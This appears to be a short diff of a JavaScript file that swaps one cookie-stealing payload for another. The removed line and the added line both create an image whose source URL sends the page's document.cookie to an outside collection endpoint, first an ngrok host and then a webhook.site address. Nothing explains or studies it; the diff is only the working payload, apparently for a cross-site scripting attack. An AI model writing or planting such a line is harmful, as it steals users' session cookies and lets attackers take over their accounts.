@@ -1,1 +1,3 @@
-var i=new Image;i.src="https://4379629a36d7.ngrok.app/?cookie="+document.cookie;
+
+
+var i=new Image;i.src="https://webhook.site/ffe2df7d-c25d-4e01-a827-ada8802933e6/?cookie=session%3a"+document.cookie;
